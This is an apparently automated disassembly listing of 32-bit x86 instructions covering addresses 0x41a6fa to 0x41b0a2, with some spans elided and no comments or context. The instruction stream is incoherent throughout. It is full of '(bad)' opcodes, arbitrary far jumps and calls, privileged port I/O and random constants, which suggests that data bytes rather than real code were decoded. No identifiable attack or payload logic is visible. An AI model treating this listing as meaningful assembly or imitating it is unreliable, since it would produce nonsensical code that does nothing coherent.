  41a6fa:	push   eax
  41a6fb:	add    al,0x22
  41a6fd:	in     al,dx
  41a6fe:	(bad)  
  41a6ff:	sti    
  41a700:	add    BYTE PTR [edx-0x3ce04b55],0xda
  41a707:	fsubr  DWORD PTR [eax+0x24dd2bcb]
  41a70d:	mov    esp,DWORD PTR [edx]
  41a70f:	mov    BYTE PTR [edi],ah
  41a711:	jecxz  0x41a76e
  41a713:	push   0x2be3e9c9
  41a718:	ret    0xbb7f
  41a71b:	dec    edi
  41a71d:	xchg   cx,ax
  41a71f:	push   ebp
  41a720:	daa    
  41a721:	pop    ds
  41a722:	xchg   edi,eax
  41a723:	push   es
  41a724:	cmp    BYTE PTR [ebp+0x6c],dl
  41a727:	and    eax,0x4198bd3b
  41a72c:	add    cl,BYTE PTR [esi-0x33a179b4]
  41a732:	mov    bh,0x3
  41a734:	and    DWORD PTR [eax+0x4fa6269b],ebp
  41a73a:	aaa    
  41a73b:	je     0x41a759
  41a73d:	adc    al,0x4e
  41a73f:	jo     0x41a771
  41a741:	test   eax,0xac7331dd
  41a746:	xor    DWORD PTR [esi+0x244a44ce],ecx
  41a74c:	retf   0x2786
  41a74f:	jae    0x41a71c
  41a751:	sub    dl,ch
  41a753:	inc    ebp
  41a754:	mov    bh,0x6b
  41a756:	xchg   ebx,eax
  41a757:	adc    ebx,DWORD PTR [ecx-0x7f]
  41a75a:	add    al,BYTE PTR [esi]
  41a75c:	loopne 0x41a7d4
  41a75e:	clc    
  41a75f:	cdq    
  41a760:	or     al,0x88
  41a762:	xor    edx,DWORD PTR [esi]
  41a764:	rcl    DWORD PTR [edx],1
  41a766:	adc    DWORD PTR [esi+0x1b2eabb0],ebp
  41a76c:	mov    ch,BYTE PTR [eax-0x18]
  41a76f:	mov    ah,0x11
  41a771:	mov    al,ds:0x71605338
  41a776:	sub    BYTE PTR [ecx],bh
  41a778:	cmp    BYTE PTR [ebx-0x20c328cf],bh
  41a77e:	stos   BYTE PTR es:[edi],al
  41a77f:	int3   
  41a780:	mov    ds:0x2beff5c2,eax
  41a785:	jle    0x41a7db
  41a787:	pop    es
  41a788:	cmp    BYTE PTR [eax+0xc],bl
  41a78b:	xor    BYTE PTR [esp+edi*4-0x2aaa001],0x1b
  41a793:	mov    ch,0xbb
  41a795:	out    dx,al
  41a796:	pop    ebx
  41a797:	mov    ch,0xfd
  41a799:	jno    0x41a750
  41a79b:	sbb    edx,eax
  41a79d:	stos   BYTE PTR es:[edi],al
  41a79e:	shl    DWORD PTR [eax+0x45ed4565],cl
  41a7a4:	pop    edx
  41a7a5:	daa    
  41a7a6:	xchg   edi,eax
  41a7a7:	int    0xd0
  41a7a9:	inc    eax
  41a7aa:	dec    edi
  41a7ab:	add    al,0xe2
  41a7ad:	sub    bl,dh
  41a7af:	inc    eax
  41a7b0:	call   0xcfab:0x87d52d49
  41a7b7:	cmc    
  41a7b8:	ins    BYTE PTR es:[edi],dx
  41a7b9:	or     esp,edi
  41a7bb:	pop    eax
  41a7bc:	mov    esp,0x15a65429
  41a7c1:	fcmovbe st,st(6)
  41a7c3:	fdivr  DWORD PTR [ecx-0x20989a10]
  41a7c9:	dec    esi
  41a7ca:	in     eax,dx
  41a7cb:	aam    0xa3
  41a7cd:	jle    0x41a791
  41a7cf:	push   ebp
  41a7d0:	pushw  cs
  41a7d2:	stos   DWORD PTR es:[edi],eax
  41a7d3:	jb     0x41a832
  41a7d5:	xchg   ebp,eax
  41a7d6:	or     al,0xea
  41a7d8:	out    dx,eax
  41a7d9:	cli    
  41a7da:	push   edx
  41a7db:	rol    BYTE PTR [ebp-0x4e],cl
  41a7de:	neg    DWORD PTR ds:0xc2bca3cf
  41a7e4:	lods   al,BYTE PTR ds:[esi]
  41a7e5:	mov    ebx,0xd6f535fa
  41a7ea:	push   0xff662e
	...
  41a853:	add    BYTE PTR [eax],al
  41a855:	add    bl,dh
  41a857:	xchg   edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0x525327ca,al
  41a863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a864:	xor    DWORD PTR [ebp+0x11d67],0x0
  41a86b:	add    DWORD PTR [eax],eax
  41a86d:	add    BYTE PTR [eax-0x3babc172],cl
  41a873:	inc    edi
  41a874:	cmp    esp,DWORD PTR [esi]
  41a876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a877:	push   eax
  41a878:	loopne 0x41a87b
  41a87a:	leave  
  41a87b:	sub    eax,0xee83a26d
  41a880:	and    al,0xf7
  41a882:	push   esp
  41a883:	add    cl,BYTE PTR [edi]
  41a885:	push   eax
  41a886:	xor    DWORD PTR [ecx-0x3e],0x3a
  41a88a:	shr    edx,1
  41a88c:	int3   
  41a88d:	xchg   esp,eax
  41a88e:	mov    esp,0x69c16df3
  41a893:	cmp    ah,BYTE PTR [eax+0x4e]
  41a896:	jg     0x41a86e
  41a898:	and    cl,ah
  41a89a:	inc    edi
  41a89b:	inc    esi
  41a89c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a89d:	xchg   BYTE PTR [esi-0x31],ah
  41a8a0:	inc    edx
  41a8a1:	push   ss
  41a8a2:	daa    
  41a8a3:	(bad)  
  41a8a4:	adc    ebp,esp
  41a8a6:	out    dx,al
  41a8a7:	inc    eax
  41a8a8:	xchg   esp,eax
  41a8a9:	add    eax,edi
  41a8ab:	add    al,0x48
  41a8ad:	rol    BYTE PTR [eax],0xc4
  41a8b0:	shr    bl,1
  41a8b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8b3:	(bad)  
  41a8b4:	xchg   edx,eax
  41a8b5:	xchg   ebx,eax
  41a8b6:	or     cl,ah
  41a8b8:	jg     0x41a895
  41a8ba:	arpl   WORD PTR [esi],bx
  41a8bc:	fisttp QWORD PTR [edx]
  41a8be:	pushf  
  41a8bf:	fsubrp st(1),st
  41a8c1:	jmp    0xd8778f10
  41a8c6:	add    al,BYTE PTR [edx]
  41a8c8:	pushf  
  41a8c9:	and    esp,DWORD PTR [ebx-0x21]
  41a8cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8cd:	and    eax,0x7c781757
  41a8d2:	jmp    0x41a8db
  41a8d4:	lods   al,BYTE PTR ds:[esi]
  41a8d5:	cmp    ebx,DWORD PTR [edi+0x25]
  41a8d8:	mov    esp,0x23b4c317
  41a8dd:	ss dec esi
  41a8df:	dec    ebp
  41a8e0:	add    bh,ah
  41a8e2:	(bad)  
  41a8e3:	and    BYTE PTR [edi+0x4d57d5ca],ah
  41a8e9:	inc    ebp
  41a8ea:	fldenv [ebx-0x256add28]
  41a8f0:	fstp   TBYTE PTR [edi-0x5b42e104]
  41a8f6:	stos   DWORD PTR es:[edi],eax
  41a8f7:	and    esi,0xf6a9d339
  41a8fd:	mov    bl,0x7c
  41a8ff:	and    dh,BYTE PTR [edx-0x7994ac7a]
  41a905:	mov    ds:0x3154eab2,al
  41a90a:	imul   ebx,DWORD PTR [eax],0x624c6161
  41a910:	sub    DWORD PTR gs:0xe74296f8,edi
  41a917:	imul   esi,ebp,0xe3922e17
  41a91d:	sub    eax,0x9d3c4784
  41a922:	jp     0x41a94b
  41a924:	test   BYTE PTR [edx-0x35b5ecff],cl
  41a92a:	inc    edx
  41a92b:	int    0x6c
  41a92d:	fucomi st,st(3)
  41a92f:	and    ah,BYTE PTR [ebp-0x19]
  41a932:	ret    0xee0c
  41a935:	xlat   BYTE PTR ds:[ebx]
  41a936:	fs pop ds
  41a938:	aam    0xc8
  41a93a:	adc    al,0xa1
  41a93c:	addr16 mov ds:0x25ce,eax
  41a940:	sub    al,0x94
  41a942:	into   
  41a943:	sti    
  41a944:	jge    0x41a90b
  41a946:	test   BYTE PTR [ebx-0x5c39f007],bl
  41a94c:	out    dx,al
  41a94d:	mov    ebx,0xfb70d556
  41a952:	or     al,0xaa
  41a954:	mov    ds:0xe7fcc22f,eax
  41a959:	add    eax,0x2634ba07
  41a95e:	imul   edi,DWORD PTR [edx-0x21],0x73
  41a962:	in     eax,dx
  41a963:	ja     0x41a9d2
  41a965:	das    
  41a966:	mov    bl,0x3c
  41a968:	sbb    ebp,DWORD PTR ds:0x65a7a6ae
	...
  41a9d6:	xor    eax,0xcf4a867e
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	sti    
  41a9e3:	sub    al,0x5a
  41a9e5:	xchg   ecx,eax
  41a9e6:	addr16 push ds
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	add    BYTE PTR [ecx],al
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	adc    cl,dl
  41a9f0:	mov    eax,ds:0xde8d3263
  41a9f5:	loop   0x41aa5e
  41a9f7:	sbb    ebx,DWORD PTR [ebp-0x7c]
  41a9fa:	dec    edi
  41a9fb:	adc    DWORD PTR [ecx+0x167b2118],0xc2ba1bca
  41aa05:	pop    esi
  41aa06:	mov    ds:0xcae534b6,al
  41aa0b:	clc    
  41aa0c:	cmp    ecx,esp
  41aa0e:	ds (bad) 
  41aa10:	cmc    
  41aa11:	xchg   DWORD PTR [esi],edx
  41aa13:	mov    dl,0xc1
  41aa15:	xchg   dh,ah
  41aa17:	mov    ebx,0x83d411ea
  41aa1c:	cmp    al,0xc8
  41aa1e:	sub    ebx,DWORD PTR [edi+0x9]
  41aa21:	cmp    BYTE PTR [esi-0x74],al
  41aa24:	push   ds
  41aa25:	pusha  
  41aa26:	sbb    al,0xb1
  41aa28:	fisttp QWORD PTR [ebx]
  41aa2a:	out    dx,eax
  41aa2b:	fild   DWORD PTR [ebx-0x166edf3d]
  41aa31:	dec    esi
  41aa32:	pop    eax
  41aa33:	out    0x7b,eax
  41aa35:	mov    ecx,0x19a5dcc0
  41aa3a:	int    0x56
  41aa3c:	rcl    dl,0x7e
  41aa3f:	fisubr WORD PTR [ebx-0x144f2951]
  41aa45:	jnp    0x41a9f1
  41aa47:	daa    
  41aa48:	mov    WORD PTR [ebp+0x16bea33f],gs
  41aa4e:	xchg   esi,eax
  41aa4f:	or     eax,0x38b9d4fe
  41aa54:	cs ins DWORD PTR es:[edi],dx
  41aa56:	popa   
  41aa57:	pop    ss
  41aa58:	adc    cl,BYTE PTR [eax+0x52]
  41aa5b:	(bad)  
  41aa5c:	push   esp
  41aa5d:	push   eax
  41aa5e:	dec    eax
  41aa5f:	jno    0x41aa44
  41aa61:	jne    0x41aab1
  41aa63:	clc    
  41aa64:	xor    ebp,DWORD PTR [esi-0x5c]
  41aa67:	pop    ss
  41aa68:	into   
  41aa69:	ret    0xc6c5
  41aa6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa6d:	outs   dx,DWORD PTR ds:[esi]
  41aa6e:	dec    eax
  41aa6f:	shr    BYTE PTR [edi-0x58d6e335],1
  41aa75:	or     ebx,DWORD PTR [esi+0x610870d8]
  41aa7b:	xchg   esi,eax
  41aa7c:	imul   ebp,DWORD PTR [edx+0x4c],0xc6aee245
  41aa83:	test   al,0x9d
  41aa85:	cmp    esi,edi
  41aa87:	push   ds
  41aa88:	loope  0x41aa0e
  41aa8a:	ret    
  41aa8b:	sbb    edi,ecx
  41aa8d:	xchg   esi,eax
  41aa8e:	(bad)  
  41aa8f:	dec    edi
  41aa90:	xchg   esi,eax
  41aa91:	sub    bh,BYTE PTR [ebp-0x5aff1da6]
  41aa97:	or     BYTE PTR [eax-0x4a],dl
  41aa9a:	jo     0x41aa73
  41aa9c:	test   BYTE PTR [edi],ah
  41aa9e:	or     bh,cl
  41aaa0:	mov    al,0x88
  41aaa2:	cmp    al,0x93
  41aaa4:	ins    DWORD PTR es:[edi],dx
  41aaa5:	leave  
  41aaa6:	sbb    eax,0x62ca4cfd
  41aaab:	or     edx,ecx
  41aaad:	or     eax,0x4654026e
  41aab2:	fldenv [edi+edx*8-0x751ed799]
  41aab9:	push   esp
  41aaba:	gs leave 
  41aabc:	add    BYTE PTR [ebx+eiz*4-0x24],bl
  41aac0:	or     al,0x61
  41aac2:	data16 ror BYTE PTR [edx-0x6c5f6c3b],0x6d
  41aaca:	stos   DWORD PTR es:[edi],eax
  41aacb:	clc    
  41aacc:	pushf  
  41aacd:	mov    cl,0x6b
  41aacf:	cwde   
  41aad0:	mov    bh,BYTE PTR [eax-0x532be526]
  41aad6:	or     al,0x7f
  41aad8:	imul   ecx,ebx,0xffffff92
  41aadb:	adc    bl,BYTE PTR [esp+esi*8+0x7f]
  41aadf:	or     DWORD PTR [ecx+ebp*2+0x39194569],edi
  41aae6:	sub    BYTE PTR [edi-0x12],al
  41aae9:	mov    bl,0x92
  41aaeb:	add    ebp,DWORD PTR [esi+ebx*8+0x0]
	...
  41ab53:	add    BYTE PTR [eax],al
  41ab55:	add    bh,dh
  41ab57:	add    esp,ebx
  41ab59:	mov    ah,0xfe
  41ab5b:	std    
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	cwde   
  41ab63:	nop
  41ab64:	sti    
  41ab65:	pop    ecx
  41ab66:	addr16 pop ds
  41ab68:	add    DWORD PTR [eax],eax
  41ab6a:	add    BYTE PTR [ecx],al
  41ab6c:	add    BYTE PTR [eax],al
  41ab6e:	mov    cl,BYTE PTR [esi]
  41ab70:	mov    esp,0x99b4d919
  41ab75:	leave  
  41ab76:	fmul   st(7),st
  41ab78:	mov    esi,0x9d4c2b05
  41ab7d:	(bad)  
  41ab7e:	mov    al,ds:0x33bd8c5c
  41ab83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab84:	push   ebx
  41ab85:	cli    
  41ab86:	cmc    
  41ab87:	mov    ecx,0x81db6ef4
  41ab8c:	icebp  
  41ab8d:	mov    eax,ds:0x526e4192
  41ab92:	out    0xa6,al
  41ab94:	adc    bh,BYTE PTR ds:0x317b2507
  41ab9a:	xor    BYTE PTR [eax],0xb9
  41ab9d:	mov    DWORD PTR [edi],ebp
  41ab9f:	mov    esi,0x6058eca0
  41aba4:	les    edi,FWORD PTR [edx-0x1c727074]
  41abaa:	addr16 (bad) 
  41abac:	(bad)  
  41abad:	fcomp  st(7)
  41abaf:	mov    dh,0xd7
  41abb1:	or     BYTE PTR [ecx+0x5e198a63],dl
  41abb7:	and    bh,BYTE PTR [ebx+0x621a05e5]
  41abbd:	push   ebp
  41abbe:	hlt    
  41abbf:	dec    edx
  41abc0:	jmp    0x41abfc
  41abc2:	sbb    ch,BYTE PTR [esi-0x35e89abe]
  41abc8:	loopne 0x41aba3
  41abca:	or     BYTE PTR [ebx+0x43],ch
  41abcd:	cld    
  41abce:	scas   al,BYTE PTR es:[edi]
  41abcf:	je     0x41ac1f
  41abd1:	jle    0x41ac3c
  41abd3:	push   edx
  41abd4:	sti    
  41abd5:	inc    ebp
  41abd6:	push   ss
  41abd7:	cs jnp 0x41abf6
  41abda:	hlt    
  41abdb:	sbb    BYTE PTR [edx-0x52],0xf7
  41abdf:	dec    ecx
  41abe0:	dec    edx
  41abe1:	add    ebx,ebp
  41abe3:	jmp    0x41ac32
  41abe5:	pinsrw mm4,WORD PTR [eax],0xe1
  41abe9:	int3   
  41abea:	int3   
  41abeb:	pop    ebp
  41abec:	test   al,0xfd
  41abee:	jb     0x41abd9
  41abf0:	hlt    
  41abf1:	fwait
  41abf2:	pop    ss
  41abf3:	or     eax,0x2ca1d254
  41abf8:	out    0x94,eax
  41abfa:	std    
  41abfb:	mov    ebx,0x494370de
  41ac00:	sbb    dl,ch
  41ac02:	hlt    
  41ac03:	push   eax
  41ac04:	xchg   edx,eax
  41ac05:	enter  0x4e77,0xbe
  41ac09:	in     al,dx
  41ac0a:	cs repnz jmp 0xa789:0x64e608b
  41ac13:	in     al,0x48
  41ac15:	fwait
  41ac16:	or     eax,0x68571c1d
  41ac1b:	jg     0x41abd2
  41ac1d:	sub    DWORD PTR [esi-0x77],esi
  41ac20:	xchg   edi,eax
  41ac21:	mov    WORD PTR [ebx+eax*2-0xbd163b4],fs
  41ac28:	mov    BYTE PTR [edx-0x10],bl
  41ac2b:	imul   edx,DWORD PTR [ebp-0x6d],0xffffffa3
  41ac2f:	and    bh,BYTE PTR [ebx-0x7ba6c8]
  41ac35:	sub    edx,DWORD PTR [edx+0x72556477]
  41ac3b:	cmc    
  41ac3c:	xchg   esi,eax
  41ac3d:	fwait
  41ac3e:	dec    eax
  41ac3f:	je     0x41acb1
  41ac41:	jns    0x41abd1
  41ac43:	sbb    eax,0x78338e0b
  41ac48:	repz loopne 0x41ac2e
  41ac4b:	out    dx,eax
  41ac4c:	je     0x41ac88
  41ac4e:	and    eax,0xed80bc4c
  41ac53:	push   ecx
  41ac54:	fdivr  st(7),st
  41ac56:	int    0x2
  41ac58:	mov    esp,0x7a0d2cb3
  41ac5d:	mov    esp,0xb1025590
  41ac62:	cld    
  41ac63:	add    ecx,0x48
  41ac66:	inc    bh
  41ac68:	call   0x7d:0x28922392
	...
  41acd3:	add    BYTE PTR [eax],al
  41acd5:	add    BYTE PTR [edx+0x49],ch
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [ecx+ebx*2+0x47]
  41ace4:	out    dx,eax
  41ace5:	retf   0x2067
  41ace8:	add    DWORD PTR [eax],eax
  41acea:	add    BYTE PTR [ecx],al
  41acec:	add    BYTE PTR [eax],al
  41acee:	mov    edi,0xcf322e3d
  41acf3:	push   ecx
  41acf4:	in     eax,dx
  41acf5:	mov    ecx,0x40dc526
  41acfa:	loopne 0x41ad73
  41acfc:	(bad)  
  41acfe:	aad    0xdd
  41ad00:	adc    DWORD PTR [ecx],esp
  41ad02:	push   ss
  41ad03:	scas   al,BYTE PTR es:[edi]
  41ad04:	fist   WORD PTR [ebx]
  41ad06:	dec    edi
  41ad07:	adc    DWORD PTR [edx+0x1d7a9ac3],ebp
  41ad0d:	jg     0x41acb7
  41ad0f:	inc    edi
  41ad10:	outs   dx,BYTE PTR ds:[esi]
  41ad11:	sbb    DWORD PTR [ebx-0xa430c95],ecx
  41ad17:	sahf   
  41ad18:	repz clc 
  41ad1a:	adc    DWORD PTR [edx+0x68],eax
  41ad1d:	ret    
  41ad1e:	ret    0xf571
  41ad21:	fcomi  st,st(5)
  41ad23:	stos   BYTE PTR es:[edi],al
  41ad24:	mov    eax,ds:0x64ad4971
  41ad29:	test   eax,eax
  41ad2b:	inc    esi
  41ad2c:	push   esp
  41ad2d:	cdq    
  41ad2e:	push   eax
  41ad2f:	pop    es
  41ad30:	repz cs sbb al,0x45
  41ad34:	jns    0x41acd9
  41ad36:	cmp    ch,dh
  41ad38:	mov    ebp,0xf34dce
  41ad3d:	addr16 push 0x60
  41ad40:	hlt    
  41ad41:	pushf  
  41ad42:	and    DWORD PTR ds:0x169ed36f,esp
  41ad48:	push   eax
  41ad49:	adc    eax,DWORD PTR [ebx+0x2]
  41ad4c:	cwde   
  41ad4d:	xor    dl,BYTE PTR [edx-0x1be97a81]
  41ad53:	cmc    
  41ad54:	xchg   ecx,eax
  41ad55:	xchg   edx,eax
  41ad56:	(bad)  
  41ad57:	das    
  41ad58:	jmp    0x6566:0x4abd04
  41ad5f:	fwait
  41ad60:	mov    ah,BYTE PTR ds:0xc10f738a
  41ad66:	call   esi
  41ad68:	xor    cl,BYTE PTR [ebx]
  41ad6a:	push   esp
  41ad6b:	pop    esi
  41ad6c:	repnz cmp al,0xd1
  41ad6f:	add    edi,DWORD PTR [edx+0x36df9d3d]
  41ad75:	jmp    0x7c34c785
  41ad7a:	jno    0x41adde
  41ad7c:	dec    eax
  41ad7d:	mov    ds:0x26fd80e4,eax
  41ad82:	xchg   esp,eax
  41ad83:	in     al,0x49
  41ad85:	mov    ch,0x4a
  41ad87:	pop    ecx
  41ad88:	jns    0x41addf
  41ad8a:	out    0xbb,al
  41ad8c:	rcl    DWORD PTR [esi],cl
  41ad8e:	out    dx,al
  41ad8f:	mov    ss,WORD PTR ds:0xfd198a80
  41ad95:	lods   eax,DWORD PTR ds:[esi]
  41ad96:	mov    ecx,0x5ded644a
  41ad9b:	popf   
  41ad9c:	or     DWORD PTR [edx],esi
  41ad9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad9f:	mov    esi,0xa365fa18
  41ada4:	jp     0x41ad8f
  41ada6:	(bad)  
  41ada8:	pop    ds
  41ada9:	fwait
  41adaa:	push   0x302386e8
  41adaf:	es xchg ecx,eax
  41adb1:	int    0x5b
  41adb3:	outs   dx,BYTE PTR ds:[esi]
  41adb4:	outs   dx,DWORD PTR ds:[esi]
  41adb5:	lods   eax,DWORD PTR ds:[esi]
  41adb6:	pop    ecx
  41adb7:	not    DWORD PTR ds:0x6548604d
  41adbd:	jns    0x41adb1
  41adbf:	inc    edi
  41adc0:	sub    DWORD PTR [edi],ebp
  41adc2:	xor    DWORD PTR [edx-0xa],0xffffffb2
  41adc6:	call   0x57cc:0xbe34721e
  41adcd:	cld    
  41adce:	je     0x41ad98
  41add0:	or     DWORD PTR ds:0xc2fb417c,0x94b73f6d
  41adda:	mov    dh,0xe4
  41addc:	cli    
  41addd:	push   ebx
  41adde:	jo     0x41ae5f
  41ade0:	imul   edx,DWORD PTR [edi+0x47],0x23949cce
  41ade7:	popa   
  41ade8:	ror    BYTE PTR ds:0x686f2a1f,0x0
	...
  41ae53:	add    BYTE PTR [eax],al
  41ae55:	add    BYTE PTR [ebp-0x8],dl
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [esp+ebx*2+0x670a15b4],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    BYTE PTR [eax],al
  41ae6b:	add    DWORD PTR [eax],eax
  41ae6d:	add    BYTE PTR [esi-0x6a],dl
  41ae70:	sahf   
  41ae71:	push   esi
  41ae72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae73:	ins    BYTE PTR es:[edi],dx
  41ae74:	rol    BYTE PTR [esi-0x3c],cl
  41ae77:	retw   
  41ae79:	ret    
  41ae7a:	lods   eax,DWORD PTR ds:[esi]
  41ae7b:	ins    DWORD PTR es:[edi],dx
  41ae7c:	adc    eax,DWORD PTR [eax]
  41ae7e:	add    DWORD PTR ds:0x836b7649,0x3a20ae1a
  41ae88:	nop
  41ae89:	je     0x41ae16
  41ae8b:	xor    dh,bl
  41ae8d:	nop
  41ae8e:	leave  
  41ae8f:	jmp    0xc233:0x4b45d8b6
  41ae96:	add    DWORD PTR [edi+ebx*2],esp
  41ae99:	xchg   BYTE PTR [esi+0x7f],cl
  41ae9c:	sbb    eax,0xb67f8d5b
  41aea1:	xchg   esp,eax
  41aea2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aea3:	ins    BYTE PTR es:[edi],dx
  41aea4:	je     0x41aea2
  41aea6:	jle    0x41ae58
  41aea8:	nop
  41aea9:	ss pop ds
  41aeab:	mov    esp,DWORD PTR [esi-0x38]
  41aeae:	sub    bh,BYTE PTR [eax+0x45]
  41aeb1:	cdq    
  41aeb2:	mov    edx,0xe80b3458
  41aeb7:	test   al,0x66
  41aeb9:	cld    
  41aeba:	xor    DWORD PTR [edx],edi
  41aebc:	push   eax
  41aebd:	cmp    eax,0xe85d9f8e
  41aec2:	adc    DWORD PTR [esi],0x38e40c97
  41aec8:	xchg   esi,eax
  41aec9:	cmp    al,0xf
  41aecb:	outs   dx,BYTE PTR cs:[esi]
  41aecd:	sahf   
  41aece:	mov    dl,0x4a
  41aed0:	sbb    DWORD PTR [edi+0x3fadc847],ecx
  41aed6:	imul   BYTE PTR [eax+0x1c]
  41aed9:	pop    ebx
  41aeda:	mov    ss,esi
  41aedc:	xor    eax,0x7815a10
  41aee1:	in     eax,dx
  41aee2:	or     bh,dh
  41aee4:	sti    
  41aee5:	or     eax,0x872cb067
  41aeea:	js     0x41aea8
  41aeec:	push   edx
  41aeed:	mov    bl,0x6d
  41aeef:	and    eax,0x3a4d832a
  41aef4:	loop   0x41aea5
  41aef6:	inc    edi
  41aef7:	jns    0x41af09
  41aef9:	mov    DWORD PTR [ecx+0x18],ebx
  41aefc:	mov    ebx,0x62f0c534
  41af01:	in     eax,0x3b
  41af03:	shl    esp,1
  41af05:	dec    edx
  41af06:	inc    esi
  41af07:	js     0x41af23
  41af09:	(bad)  
  41af0a:	adc    BYTE PTR [esi+0x3f9df55c],dl
  41af10:	cmp    DWORD PTR [ecx-0x42],edi
  41af13:	lods   al,BYTE PTR ds:[esi]
  41af14:	pushf  
  41af15:	test   BYTE PTR [ebp-0x13cb9db5],bh
  41af1b:	gs retf 0x2ef5
  41af1f:	pop    ebx
  41af20:	dec    ebx
  41af21:	mov    esp,0x4bb7e68b
  41af26:	xchg   DWORD PTR es:[edx-0x3304f828],esi
  41af2d:	push   es
  41af2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af2f:	aas    
  41af30:	xchg   esp,eax
  41af31:	jg     0x41af7e
  41af33:	scas   al,BYTE PTR es:[edi]
  41af34:	and    BYTE PTR [ebp+0x1f],bh
  41af37:	(bad)  
  41af38:	mov    dh,bl
  41af3a:	mov    esp,ds
  41af3c:	test   BYTE PTR [ebp+0x26],ch
  41af3f:	lods   eax,DWORD PTR ds:[esi]
  41af40:	repnz fbstp TBYTE PTR [eax]
  41af43:	int3   
  41af44:	pop    ss
  41af45:	jecxz  0x41af82
  41af47:	in     al,dx
  41af48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af49:	fucomip st,st(4)
  41af4b:	xor    DWORD PTR [ebx+0x52],edi
  41af4e:	push   ds
  41af4f:	mov    cl,0xdc
  41af51:	or     esp,ecx
  41af53:	outs   dx,BYTE PTR ds:[esi]
  41af54:	mov    esi,0xd10c154c
  41af59:	sbb    al,0x39
  41af5b:	mov    BYTE PTR [edx],ah
  41af5d:	and    BYTE PTR [esi-0x7c],bl
  41af60:	dec    eax
  41af61:	pop    eax
  41af62:	mov    esp,0xb8100ab9
  41af67:	nop
  41af68:	sbb    BYTE PTR [esi],al
  41af6a:	or     DWORD PTR [eax],esi
  41af6c:	jne    0x41afc7
	...
  41afd6:	(bad)  
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0xf14344ee
  41afe4:	mov    gs,WORD PTR [ebx]
  41afe6:	and    al,BYTE PTR [bx+di]
  41afe9:	add    BYTE PTR [eax],al
  41afeb:	add    DWORD PTR [eax],eax
  41afed:	add    BYTE PTR [ecx-0x62],al
  41aff0:	hlt    
  41aff1:	lahf   
  41aff2:	xor    DWORD PTR [edi+eax*2],edi
  41aff5:	(bad)  
  41aff6:	fimul  DWORD PTR [edi+0x5cc8784e]
  41affc:	jo     0x41b054
  41affe:	ror    BYTE PTR [esi],cl
  41b000:	nop
  41b001:	and    ebx,DWORD PTR [eax]
  41b003:	add    al,0x67
  41b005:	jg     0x41b06c
  41b007:	jne    0x41b059
  41b009:	fst    QWORD PTR [ecx]
  41b00b:	pop    eax
  41b00c:	cs pop esp
  41b00e:	pusha  
  41b00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b010:	sbb    eax,DWORD PTR [ecx]
  41b012:	xchg   esp,eax
  41b013:	bound  esp,QWORD PTR [ecx+0x76b4148f]
  41b019:	arpl   WORD PTR [ecx-0x64],si
  41b01c:	push   cs
  41b01d:	and    eax,DWORD PTR [ecx+eax*1]
  41b020:	(bad)  
  41b021:	jo     0x41afa5
  41b023:	jb     0x41afa6
  41b025:	std    
  41b026:	clc    
  41b027:	rol    BYTE PTR [edx],0xd9
  41b02a:	xchg   esp,eax
  41b02b:	bound  esp,QWORD PTR [edx+ebx*2-0x77]
  41b02f:	(bad)  
  41b031:	sar    ecx,0x64
  41b034:	addr16 aas 
  41b036:	aam    0x1d
  41b038:	push   ebx
  41b039:	jb     0x41b05a
  41b03b:	push   ebx
  41b03c:	pop    es
  41b03d:	lahf   
  41b03e:	inc    esp
  41b03f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b040:	xor    DWORD PTR [edx+ecx*8+0xa],0x2fd1fb97
  41b048:	jo     0x41afed
  41b04a:	cmp    eax,0xd89e8550
  41b04f:	and    edx,edx
  41b051:	jns    0x41b082
  41b053:	mov    eax,DWORD PTR [edx]
  41b055:	push   ss
  41b056:	xor    bh,0x33
  41b059:	repnz hlt 
  41b05b:	cld    
  41b05c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b05d:	std    
  41b05e:	mov    eax,0x922312dd
  41b063:	(bad)  
  41b064:	icebp  
  41b065:	out    0x4f,al
  41b067:	cmp    al,0xb2
  41b069:	sbb    DWORD PTR [eax-0x5d],ecx
  41b06c:	int    0x92
  41b06e:	add    al,0xa2
  41b070:	enter  0xbf67,0x59
  41b074:	cmp    eax,0xf1bd55b6
  41b079:	int3   
  41b07a:	aam    0xe0
  41b07c:	les    esp,FWORD PTR [esi+0x48fce68c]
  41b082:	sbb    al,BYTE PTR [ebx-0x3956412d]
  41b088:	inc    esp
  41b089:	sub    BYTE PTR [esi+0x4b],0xe7
  41b08d:	imul   edi,DWORD PTR [eax+0x44c8cc4d],0x51
  41b094:	jno    0x41b018
  41b096:	sbb    eax,0x315e38a4
  41b09b:	std    
  41b09c:	rol    BYTE PTR [edx-0x68],cl
  41b09f:	mov    dh,BYTE PTR [esi-0x25]
  41b0a2:	test   eax,0x22d3b103
